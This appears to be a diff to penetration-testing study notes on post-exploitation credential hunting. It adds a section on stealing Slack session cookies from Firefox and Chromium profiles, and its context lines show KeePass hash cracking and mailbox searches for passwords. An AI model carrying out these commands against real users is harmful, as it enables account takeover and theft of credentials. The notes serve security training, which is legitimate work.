@@ -864,7 +864,7 @@ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/ro
 
 ### Email
 - If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc.
-- [](https://github.com/dafthack/MailSniper)
+- [MailSniper](https://github.com/dafthack/MailSniper)
 ```powershell
 # To search all mailboxes in a domain:
 Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv
@@ -910,6 +910,29 @@ netsh wlan show profile
 netsh wlan show profile <profilename> key=clear
 ```
 
+### Abusing Cookies to Get Access to IM Clients
+
+#### slack 
+- there is cookie named `d`, which Slack uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user.
+- check blogs [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/)
+- tool [SlackExtract](https://github.com/clr2of8/SlackExtract)
+
+##### Cookie Extraction from Firefox
+```powershell
+# %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release
+
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+```
+
+##### Cookie Extraction from Chromium-based Browsers
+- [SharpChromium](https://github.com/djhohnstein/SharpChromium)
+- [Invoke-SharpChromium](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
+
+```powershell
+
+
+```
 # Interacting with Users
 ### Process Command Lines
 ```powershell
